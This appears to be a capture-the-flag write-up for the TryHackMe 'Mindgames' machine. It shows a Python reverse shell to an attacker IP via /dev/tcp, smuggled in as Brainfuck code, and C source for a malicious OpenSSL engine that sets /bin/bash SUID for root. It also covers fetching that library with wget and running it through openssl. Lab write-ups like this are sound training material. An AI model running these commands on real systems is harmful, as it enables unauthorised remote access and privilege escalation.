---
date: 2020-06-12 21:12:32
layout: post
title: "Mindgames"
subtitle: Hard Machine from Tryhackme
description: 
image: /writeup/assets/img/mindgames/mindgames.png
optimized_image:
category: tryhackme
tags: hard
author:
paginate: false
---
<a href="https://tryhackme.com/room/mindgames">Link</a> to the machine on tryhackme.

I started with the nmap scan to look for open ports.
```bash
nmap -T4 -p- -A 10.10.132.232
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-13 03:14 IST
Nmap scan report for 10.10.132.232
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 24:4f:06:26:0e:d3:7c:b8:18:42:40:12:7a:9e:3b:71 (RSA)
|   256 5c:2b:3c:56:fd:60:2f:f7:28:34:47:55:d6:f8:8d:c1 (ECDSA)
|_  256 da:16:8b:14:aa:58:0e:e1:74:85:6f:af:bf:6b:8d:58 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Mindgames.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%), Linux 3.7 - 3.10 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   326.10 ms 10.9.0.1
2   326.18 ms 10.10.132.232

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.36 seconds

```

Found 2 open ports. Accessed the site hosted on port 80 to find obfuscated text called Brainfuck programming language.
![placeholder](/writeup/assets/img/mindgames/site.png "site")
Decrypted the examples given on site using <a href="https://www.dcode.fr/brainfuck-language">Dcode.fr</a>
![placeholder](/writeup/assets/img/mindgames/print.png "helloworld")

The Brainfuck code translated into the python3 commands and those commands were executed.

Created a payload of python reverse shell in Brainfuck language by using this <a href="https://copy.sh/brainfuck/text.html">Website</a>
```python3
import os

os.system('bash -c "bash -i >& /dev/tcp/10.9.12.192/8888 0>&1"')
```
![placeholder](/writeup/assets/img/mindgames/payload.png "payload")

Executed the payload through the website homepage to get a reverse shell.

Got the user shell and found the user.txt

Ran Linpeas on the machine and found some interesting capabilities.
![placeholder](/writeup/assets/img/mindgames/cap.png "capabilities")
 
 So the openssl binary was given interesting permission *setuid*
 
 Went to GTFObins and found that openssl command can be used to load specific shared libraries to execute commands.
![placeholder](/writeup/assets/img/mindgames/so.png "sharedlibrary")

Tried to create a .so file from simple c++ code. But falied.

Found this <a href="https://www.openssl.org/blog/blog/2015/10/08/engine-building-lesson-1-a-minimum-useless-engine/">page</a> and used the code from it to create .so file.
```c
#include <openssl/engine.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

static const char *engine_id = "test";
static const char *engine_name = "hope it works";

static int bind(ENGINE *e, const char *id)
{
  int ret = 0;

  if (!ENGINE_set_id(e, engine_id)) {
    fprintf(stderr, "ENGINE_set_id failed\n");
    goto end;
  }
  if (!ENGINE_set_name(e, engine_name)) {
    printf("ENGINE_set_name failed\n");
    goto end;
  }
  setuid(0);
  setgid(0);
  system("chmod u+s /bin/bash");      #Makes /bin/bash SUID binary
  system("echo done");
  ret = 1;
 end:
  return ret;
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```
Made a shared library out of this c++ code.
```bash
gcc -c fPIC test.c -o test
gcc -shared -o test.so -lcrypto test
```

Uploaded the file to the machine using wget,
```bash
wget http://10.9.12.192/test.so
``` 
Executed the following command from GTFObins to make the bash binary a SUID binary.
```
openssl req -engine /home/mindgames/test.so
```
![placeholder](/writeup/assets/img/mindgames/rce.png "rce")
This made the bash binary a SUID binary.

```bash 
bash -p
```
Got the root shell and found root.txt.
![placeholder](/writeup/assets/img/mindgames/root.png "root") 
